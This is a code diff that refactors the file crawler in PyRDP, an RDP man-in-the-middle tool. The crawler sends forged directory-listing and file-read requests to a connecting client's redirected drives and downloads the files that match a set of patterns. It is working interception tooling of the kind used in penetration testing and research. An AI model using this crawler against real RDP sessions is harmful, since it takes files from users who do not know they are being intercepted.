@@ -3,18 +3,19 @@
 # Copyright (C) 2019 GoSecure Inc.
 # Licensed under the GPLv3 or later.
 #
+import fnmatch
 from collections import defaultdict
 from logging import LoggerAdapter
 from pathlib import Path
-from typing import BinaryIO, Dict, List, Optional, Set
+from typing import Dict, List, Optional, Set
 
 from pyrdp.enum.virtual_channel.device_redirection import DeviceType
-from pyrdp.mitm.config import MITMConfig
 from pyrdp.mitm.DeviceRedirectionMITM import DeviceRedirectionMITM, DeviceRedirectionMITMObserver
+from pyrdp.mitm.FileMapping import FileMapping
+from pyrdp.mitm.config import MITMConfig
 from pyrdp.mitm.state import RDPMITMState
 from pyrdp.pdu import DeviceAnnounce
 
-import fnmatch
 
 class VirtualFile:
     """
@@ -61,12 +62,11 @@ class FileCrawlerMITM(DeviceRedirectionMITMObserver):
         self.deviceRedirection: Optional[DeviceRedirectionMITM] = None
 
         # Pending crawler requests
-        self.fileDownloadRequests: Dict[int, Path] = {}
         self.directoryListingRequests: Dict[int, Path] = {}
         self.directoryListingLists = defaultdict(list)
 
         # Download management
-        self.downloadFiles: Dict[str, BinaryIO] = {}
+        self.fileMappings: Dict[str, FileMapping] = {}
         self.downloadDirectories: Set[int] = set()
 
         # Crawler detection patterns
@@ -101,9 +101,6 @@ class FileCrawlerMITM(DeviceRedirectionMITMObserver):
         Should only be called once.
         """
 
-        matchPath = None
-        ignorePath = None
-
         # Get the default file in pyrdp/mitm/crawler_config
         if self.config.crawlerMatchFileName:
             matchPath = Path(self.config.crawlerMatchFileName).absolute()
@@ -126,7 +123,7 @@ class FileCrawlerMITM(DeviceRedirectionMITMObserver):
         try:
             with open(path, "r") as f:
                 for line in f:
-                    if line and line[0] in ["#", " ", "\n"]:
+                    if not line or line[0] in ["#", " ", "\n"]:
                         continue
 
                     patternList.append(line.lower().rstrip())
@@ -136,10 +133,22 @@ class FileCrawlerMITM(DeviceRedirectionMITMObserver):
 
         return patternList
 
+    def onDeviceAnnounce(self, device: DeviceAnnounce):
+        if device.deviceType == DeviceType.RDPDR_DTYP_FILESYSTEM:
+
+            drive = VirtualFile(device.deviceID, device.preferredDOSName, "/", True)
+
+            self.devices[drive.deviceID] = drive
+            self.unvisitedDrive.append(drive)
+
+            # If the crawler hasn't started, start one instance
+            if len(self.devices) == 1:
+                self.dispatchDownload()
+
     def dispatchDownload(self):
         """
         Processes each queue in order of priority.
-        File download have priority over directory download.
+        File downloads have priority over directory downloads.
         Crawl each folder before visiting another drive.
         """
 
@@ -161,14 +170,55 @@ class FileCrawlerMITM(DeviceRedirectionMITMObserver):
         # List an unvisited drive
         elif len(self.unvisitedDrive) != 0:
             drive = self.unvisitedDrive.pop()
-
-            # TODO : Maybe dump whole drive if there isn't a lot of files?
-            # Maybe if theres no directory at the root directory -> dump all?
             self.log.info("Begin crawling disk %(disk)s", {"disk" : drive.name})
             self.fileLogger.info("Begin crawling disk %(disk)s", {"disk" : drive.name})
             self.listDirectory(drive.deviceID, drive.path)
         else:
             self.log.info("Done crawling.")
+
+    def listDirectory(self, deviceID: int, path: str, download: bool = False):
+        """
+        List the directory
+        :param deviceID: Drive we are actually listing.
+        :param path: Path of the directory we are listing.
+        :param download: Wether or not we need to download this directory.
+        """
+        listingPath = str(Path(path).absolute()).replace("/", "\\")
+
+        if not listingPath.endswith("*"):
+            if not listingPath.endswith("\\"):
+                listingPath += "\\"
+
+            listingPath += "*"
+
+        requestID = self.deviceRedirection.sendForgedDirectoryListing(deviceID, listingPath)
+
+        # If the directory is flagged for download, keep trace of the incoming request to trigger download.
+        if download:
+            self.downloadDirectories.add(requestID)
+
+        self.directoryListingRequests[requestID] = Path(path).absolute()
+
+    def onDirectoryListingResult(self, deviceID: int, requestID: int, fileName: str, isDirectory: bool):
+        if requestID not in self.directoryListingRequests:
+            return
+
+        path = self.directoryListingRequests[requestID]
+        filePath = path / fileName
+
+        file = VirtualFile(deviceID, fileName, str(filePath), isDirectory)
+        directoryList = self.directoryListingLists[requestID]
+        directoryList.append(file)
+
+    def onDirectoryListingComplete(self, deviceID: int, requestID: int):
+        self.directoryListingRequests.pop(requestID, {})
+
+        # If directory was flagged for download
+        if requestID in self.downloadDirectories:
+            self.downloadDirectories.remove(requestID)
+            self.addListingToDownloadQueue(requestID)
+        else:
+            self.crawlListing(requestID)
 
     def addListingToDownloadQueue(self, requestID: int):
         directoryList = self.directoryListingLists.pop(requestID, {})
@@ -181,6 +231,7 @@ class FileCrawlerMITM(DeviceRedirectionMITMObserver):
                 self.matchedDirectoryQueue.append(item)
             else:
                 self.matchedFileQueue.append(item)
+
         self.dispatchDownload()
 
     def crawlListing(self, requestID: int):
@@ -211,74 +262,34 @@ class FileCrawlerMITM(DeviceRedirectionMITMObserver):
                 if matched:
                     self.matchedFileQueue.append(item)
 
-            self.fileLogger.info("%(file)s - %(isDirectory)s - %(isDownloaded)s", {"file" : item.path, "isDirectory": item.isDirectory, "isDownloaded": matched})
+            self.fileLogger.info("%(file)s - %(isDirectory)s - %(isMatched)s", {
+                "file" : item.path,
+                "isDirectory": item.isDirectory,
+                "isMatched": matched
+            })
+
         self.dispatchDownload()
 
     def downloadFile(self, file: VirtualFile):
         remotePath = file.path
-        basePath = f"{self.config.fileDir}/{self.log.sessionID}"
-        localPath = f"{basePath}{remotePath}"
+        mapping = FileMapping.generate(
+            remotePath,
+            self.config.fileDir,
+            self.deviceRedirection.createDeviceRoot(file.deviceID),
+            self.log
+        )
 
-        self.log.info("Saving %(remotePath)s to %(localPath)s", {"remotePath": remotePath, "localPath": localPath})
-
-        try:
-            # Create parent directory, don't raise error if it already exists
-            Path(localPath).parent.mkdir(parents=True, exist_ok=True)
-            targetFile = open(localPath, "wb")
-        except Exception as e:
-            self.log.exception(e)
-            self.log.error("Cannot save file: %(localPath)s", {"localPath": localPath})
-            return
-
-        self.downloadFiles[remotePath] = targetFile
+        self.fileMappings[remotePath] = mapping
         self.deviceRedirection.sendForgedFileRead(file.deviceID, remotePath)
 
-    def listDirectory(self, deviceID: int, path: str, download: bool = False):
-        """
-        List the directory
-        :param deviceID: Drive we are actually listing.
-        :param path: Path of the directory we are listing.
-        :param download: Wether or not we need to download this directory.
-        """
-        listingPath = str(Path(path).absolute()).replace("/", "\\")
-
-        if not listingPath.endswith("*"):
-            if not listingPath.endswith("\\"):
-                listingPath += "\\"
-
-            listingPath += "*"
-
-        requestID = self.deviceRedirection.sendForgedDirectoryListing(deviceID, listingPath)
-
-        # If the directory is flagged for download, keep trace of the incoming request to trigger download.
-        if download:
-            self.downloadDirectories.add(requestID)
-
-        self.directoryListingRequests[requestID] = Path(path).absolute()
-
-    def onDeviceAnnounce(self, device: DeviceAnnounce):
-        if device.deviceType == DeviceType.RDPDR_DTYP_FILESYSTEM:
-
-            drive = VirtualFile(device.deviceID, device.preferredDOSName, "/", True)
-
-            self.devices[drive.deviceID] = drive
-            self.unvisitedDrive.append(drive)
-
-            # If the crawler hasn't started, start one instance
-            if len(self.devices) == 1:
-                self.dispatchDownload()
-
     def onFileDownloadResult(self, deviceID: int, requestID: int, path: str, offset: int, data: bytes):
-        remotePath = path.replace("\\", "/")
-
-        targetFile = self.downloadFiles[remotePath]
-        targetFile.write(data)
+        mapping = self.fileMappings[path]
+        mapping.seek(offset)
+        mapping.write(data)
 
     def onFileDownloadComplete(self, deviceID: int, requestID: int, path: str, errorCode: int):
-        remotePath = path.replace("\\", "/")
-
-        file = self.downloadFiles.pop(remotePath)
-        file.close()
+        mapping = self.fileMappings.pop(path)
+        mapping.finalize()
 
         if errorCode != 0:
             # TODO : Handle common error codes like :
@@ -286,29 +297,8 @@ class FileCrawlerMITM(DeviceRedirectionMITMObserver):
             # Doc : https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/18d8fbe8-a967-4f1c-ae50-99ca8e491d2d
 
             self.log.error("Error happened when downloading %(remotePath)s. The file may not have been saved completely. Error code: %(errorCode)s", {
-                "remotePath": remotePath,
+                "remotePath": path,
                 "errorCode": "0x%08lx" % errorCode,
             })
 
         self.dispatchDownload()
-
-    def onDirectoryListingResult(self, deviceID: int, requestID: int, fileName: str, isDirectory: bool):
-        if requestID not in self.directoryListingRequests:
-            return
-
-        path = self.directoryListingRequests[requestID]
-        filePath = path / fileName
-
-        file = VirtualFile(deviceID, fileName, str(filePath), isDirectory)
-        directoryList = self.directoryListingLists[requestID]
-        directoryList.append(file)
-
-    def onDirectoryListingComplete(self, deviceID: int, requestID: int):
-        self.directoryListingRequests.pop(requestID, {})
-
-        # If directory was flagged for download
-        if requestID in self.downloadDirectories:
-            self.downloadDirectories.remove(requestID)
-            self.addListingToDownloadQueue(requestID)
-        else:
-            self.crawlListing(requestID)
